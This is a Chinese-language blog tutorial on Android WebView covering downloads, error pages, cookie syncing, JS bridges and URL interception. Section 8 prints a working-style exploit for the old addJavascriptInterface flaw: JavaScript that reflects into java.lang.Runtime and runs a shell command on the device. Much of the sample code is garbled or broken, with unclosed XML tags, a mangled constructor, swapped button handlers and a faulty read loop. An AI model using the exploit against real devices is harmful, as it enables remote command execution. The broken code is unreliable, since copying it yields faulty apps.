---
title: Android-WebView
date: 2018-01-24 21:04:52
tags: Android
---
### 一、为什么要用WebView
* 兼容已有项目
* 可以动态更新
* 缺点：耗电、加载慢、发热

### 二、WebView的使用
* 1、在AndroidMainfest.xml中添加网络权限，
* 2、在activity中加载webview，为了防止调用系统的浏览器，去要添加setWebViewClient方法兼听则明

 
 ```
 WebView webView=(WebView)findViewById(R.id.webView);
 webView.loadUrl("http://www.baidu.com");
 webView.setWebChromeClient(new WebChromeClient(){
 	@Override
   public void onReceivedTitle(WebView view,String title){
   	super.onReceivedTitle(view,title);
   }
 });
 
 ```


### 三、自定义WebView 的Title
如何在加载页面时显示url信息呢？
* 首先在activity_main.xml文件中添加一个表头的配置

```
 <RelativeLayout
 		andorid:id="@+id/web_title"
 		android:layout_width="match_parent"
 	 	andorid:layout_height="50dip">
 	  <Button
 	   android:id="@+id/back"
 	   android:layout_alignParentLeft="true"
 	  	android:text="返回"
 		android:layout_width="wrap_content"
 	 	andorid:layout_height="40dip">
 	  
 	  <TextView
 	   android:id="@+id/title"
 	   android:layout_centerInParent="true"
 		android:layout_width="wrap_content"
 	 	andorid:layout_height="wrap_content">
 	  
 	  <Button
 	   android:id="@+id/refresh"
 	   android:layout_alignParentRight="true"
 	  	android:text="刷新"
 		android:layout_width="wrap_content"
 	 	andorid:layout_height="40dip">
 <RelativeLayout>
 <WebView
 		andorid:id="@+id/webView"
 		android:layout_width="match_parent"
 	 	andorid:layout_height="match_parent">
```


然后在activity中写入

```
Button back=(Button)findViewById(R.id.back);
Button refresh=(Button)findViewById(R.id.refresh);

TextView titleView=(TextView)findViewById(R.id. title);

webView.setWebChromeClient(new WebChromeClient(){
 	@Override
   public void onReceivedTitle(WebView view,String title){
   titleView.setText(title);
   	super.onReceivedTitle(view,title);
   }
 });
 
 
 back.setOnClickListener(new MyListener());
 refresh.setOnClickListener(new MyListener());
 
 class MyListener implements View.OnClickListener{
 	@Override
 	public void onClick(View view){
 		switch(view.getId()){
 			case R.id.back:
 				//刷新
 				webView.reload();
 				break;
 			case R.id.refresh:
 				finish();
 				break;
 			default:
 				break;
 		}
 	}
 }
 
```

### 四、利用WebView下载文件
若要使浏览器可以下载文件，需要让webView实现一个接口
#### 1、手动创建一个HttpThread类
```Java
public class HttpThread extends Thread{
	private String mUrl;
	//传递进来要下载的地址
	public HttpThread(String url){
		this.mUrl=url;
	}


	@Override
	public void run(){
		try{
		   System.out.println("开始下载");
			URL httpUrl=new URL(mUrl);
			HttpURLConnection conn=(HttpURLConnection)httpUrl.openConnection();
			conn.setDoInput(true);
			conn.setDoOutput(true);
			//输入流对象
			InputStream in=conn.getInputStream();
			
			//输出流对象
			OutputStream out;
			
			//下载目录
			File downloadFile;
			File sdFile;
			
			//判断SD卡是否已挂载
			if(Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)){
				downloadFile=Environment.getExternalStorageDirectory();
				sdFile=new File(downloadFile,"test.apk");
				
				out=new FileOutputStream(sdFile);
			}
			
			byte[] b=new byte[6*1024];
			int len;
			while(len=in.read(b)!=-1){
				if(out!=null){
					out.write(b,0,len);
				}
			}
			
			if(out!=null){
				out.close();
			}
			if(in!=null){
				in.close();
			}
			System.out.println("下载完成");
			
		}catch(Exception e){
		}
	}
}

```
#### 2、然后给webView实现DownloadListenr
```Java
webView.loadUrl("http://shouji.baidu.com");

webView.setDownloadListener(new MyDownload());

class MyDownload implements DownloadListener{
	@Override
	public void onDownloadStart(String url,String userAgent,
	String contentDisposition,String mimetype,long contentLength){
	
		//判断要下载的文件类型
		if(url.endWith(".apk")){
			new HttpThread(url).start();
		}
		
	}
}

```

这样的话，如果页面中有下载的操作，就会按照我们的步骤执行了

#### 3、如何使用系统浏览器下载文件呢
调用系统下载比较简单，也比较快

```Java
class MyDownload implements DownloadListener{
	@Override
	public void onDownloadStart(String url,String userAgent,
	String contentDisposition,String mimetype,long contentLength){
	
		//判断要下载的文件类型
		if(url.endWith(".apk")){
			Uri uri=Uri.parse(url);
			Intent intent=new Intent(Intent.ACTION_VIEW,uri);
			startActivity(intent);
		}
		
	}
}
```

### 五、WebView的错误码处理
比如断网情况下加载一个页面，肯定会出现一个不太友好的页面，这样体验不好。常用的是加载一个本地的错误页面，或者一个native页面。怎么做呢

**只需要在webView的`setWebViewClient`监听中，重写`onReceiveError`方法即可**
首先需要在asserts目录下放置一个error.html文件

```Java
webView.setWebViewClient(new WebViewClent(){
	@Override
	public boolean shouldOverrideUrlLoading(WebView view,String url){
		view.loadUrl(url);
		return super.shouldOverrideUrlLoading(view , url);
	}
	
	
	@Override
	public void onReceivedError(WebView view,int errorCode,String description, String failingUrl){
		super.onRecievedError(view,errorCode,description,failingUrl);
		//加载本地错误页面
		view.loadUrl("file:///android_asset/error.html");
	}
	
});

```
当然也可以将WebView控件隐藏，显示另一显示错误的控件。同样是在`onReceivedError`方法中处理

### 六、WebView的同步cookie
1、首先创建一个HTTPCookie的方法

```Java
public class HttpCookie extends Thread{

	//用来向外传递信息
	private Handler handler;
	
	public HttpCookie(tends Thread{
	private ){
		this.handler=handler;
	}

	@Override
	public void run(){
		super.run();
		HttpClient client=new DefaultHttpClient();
		
		HttpPost post=new HttpPost("192.168.1.102:8080/webs/loign");
		List<NameValuePair> list=new ArrayList<NameValuePair>();
		list.add(new BasicNameValuePair("name","wanger"));
		list.add(new BasicNameValuePair("age",12));
		
		try{
			post.setEntity(new UrlEncodeFromEntity(list));
			HttpResponse response=client.execute(post);
			
			if(response.getStatusLine().getStatusCode()==200){
				AbstractHttpClient absClient=(AbstractHttpClient)client;
				
				List<Cookie> cookies=absClient.getCookieStore().getCookies();
				
				for(Cookie cookie :cookies){
					System.out.println("name="+cookie.getName()+"age="+cookie.getValue);
					
					Message message=new Message();
					message.obj=cookie;
					handler.sendMessage(message);
					
					return;
				}
				
				
			}
		}catch(Exception e){
		}
		
		
	}
}
```

2、然后在MainActivity中相应的地方添加 

```Java
private Handler handler=new Handler(){
	public void handlerMessage(android.os.Message msg){
		String cookie=msg.obj.toString();
		
		CookieSyncManager.createInstance(MainActivity.this);
		CookieManager cookieManager=CookieManager.getInstance();
		cookieManager.setAcceptCookie(true);
		cookieManager.setCookie("http://192.168.1.102:8080",cookie);
		CookieSyncManager.getInstance().sync();
		
		webView.loadUrl("192.168.1.102:8080/webs/index.html");
	}
}

new HttpCookie(handler).start();
```


### 七、WebView与JS调用混淆问题
正常情况下WebView和JS是可以互相调用的，到那时当把apk发布时需要一个release包，而release包通常需要混淆处理，就会发生WebView与JS无法调用。
比如
1、创建一个类

```Java
public class WebHost{
	private Context context;
	public WebHost(Context context){
		this.context=context;
	}
	public void callJs(){
		Toast.makeText(context,"call form js",Toast.LENGTH_LONG);
	}
}
```
2、然后在MainActivity中添加

```Java
webView.getSetting().setJavaScriptEnable(true);
webView.addJavaScriptInterface(new WebHost(this),"js");
```
3、最后在html页面中添加一个js方法,并给某个按钮添加监听

```JavaScript
function call(){
	js.callJs();
}
```

此时运行app是可以正常调用js的方法的，但是对代码混淆后，却发现不能用了，这时需要在混淆配置文件中将相应的类添加进入
```
-keep public class com.example.webview01.WebHost{
	public <methods>;
}
```
这时混淆后的代码就可以正常执行了 


### 八、WebView导致的远程注入问题 
如果通过恶意代码从web页面拿到手机上的照片等信息，会很危险。4.2之后已修复。
如下面的js代码，遍历js对象，拿到映射的java对象

```JavaScript
function check(){
	for(var obj in window){
		try{
			if("getClass" in window[obj]){
				try{
					window[obj].getClass();
					document.write('<span style="color:red;font-size:22px">'
					+obj+'</span>');
					document.write('<br />');
				}catch(e){}
			}
		}catch(e){
		}
	}
}

//通过反射加载一个Runtime类
function execute(cmdArgs){
	return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
}

try{
	execute(["/system/bin/sh","-c",
	"ls /mnt/scdcard > /sdcard/log-netstat.txt"]);
}catch(e){
	alert(e);
}
```
### 九、WebView自定义拦截
虽然有些浏览器厂商已经解决了远程注入的问题，但是作为开发人员也因该减少与js的调用，并且设置一定的规则。
通常情况下需要定义协议，让js来打开本地客户端
例如要通过js启动一个新的activity
```JavaScript
<a href="http://192.168.1.102:8080/webs/error.html?startActivity">
```

然后在ManiActivity中进行拦截

```Java
webView.setWebViewClient(new WebViewClent(){
	@Override
	public boolean shouldOverrideUrlLoading(WebView view,String url){
	
		//根据协议来启动新的activity
		if(url.endWith("?startActivity")){
			Intent intent=new Intent(ManiActivity.this,SecondActivity.class);
			startActivity(intent);
			return true;
		}
		view.loadUrl(url);
		return super.shouldOverrideUrlLoading(view , url);
	}
	
	
		
});

``` 

